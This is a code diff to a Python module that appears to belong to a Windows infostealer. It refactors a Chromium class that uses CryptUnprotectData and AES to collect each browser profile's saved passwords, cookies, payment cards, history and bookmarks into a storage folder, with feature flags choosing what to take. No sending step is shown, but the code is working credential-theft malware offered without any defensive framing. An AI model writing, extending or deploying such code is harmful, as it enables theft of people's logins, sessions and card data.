@@ -10,18 +10,22 @@ from os import path, makedirs, remove, listdir
 from Crypto.Cipher import AES
 from win32.win32crypt import CryptUnprotectData
 
+from ..enums.features import Features
 from ..utils.config import ChromiumConfig
 
 
 class Chromium(Process):
 
-    def __init__(self, *args):
+    def __init__(self, browser_name: str, storage_path: str, state_path: str, browser_path: str, statuses: list, errors: bool):
         Process.__init__(self)
 
         self.config = ChromiumConfig()
-
-        for index, variable in enumerate(self.config.Variables):
-            self.__dict__.update({variable: args[index]})
+        self.browser_name = browser_name
+        self.storage_path = storage_path
+        self.state_path = state_path
+        self.browser_path = browser_path
+        self.statuses = statuses
+        self.errors = errors
 
         self.path = rf"{self.storage_path}\Browsers\{self.browser_name}"
 
@@ -165,7 +169,7 @@ class Chromium(Process):
     def _get_browser_paths(self, profile):
         return (
             {
-                "status": self.statuses[0],
+                "status": True if Features.passwords in self.statuses else False,
                 "name": "Passwords",
                 "path": rf"{profile}\Login Data",
                 "alt_path": None,
@@ -173,7 +177,7 @@ class Chromium(Process):
                 "error": "No passwords found"
             },
             {
-                "status": self.statuses[1],
+                "status": True if Features.cookies in self.statuses else False,
                 "name": "Cookies",
                 "path": rf"{profile}\Cookies",
                 "alt_path": rf"{profile}\Network\Cookies",
@@ -181,7 +185,7 @@ class Chromium(Process):
                 "error": "No cookies found"
             },
             {
-                "status": self.statuses[2],
+                "status": True if Features.cards in self.statuses else False,
                 "name": "Cards",
                 "path": rf"{profile}\Web Data",
                 "alt_path": None,
@@ -189,7 +193,7 @@ class Chromium(Process):
                 "error": "No cards found"
             },
             {
-                "status": self.statuses[3],
+                "status": True if Features.history in self.statuses else False,
                 "name": "History",
                 "path": rf"{profile}\History",
                 "alt_path": None,
@@ -197,7 +201,7 @@ class Chromium(Process):
                 "error": "No history found"
             },
             {
-                "status": self.statuses[4],
+                "status": True if Features.bookmarks in self.statuses else False,
                 "name": "Bookmarks",
                 "path": rf"{profile}\Bookmarks",
                 "alt_path": None,
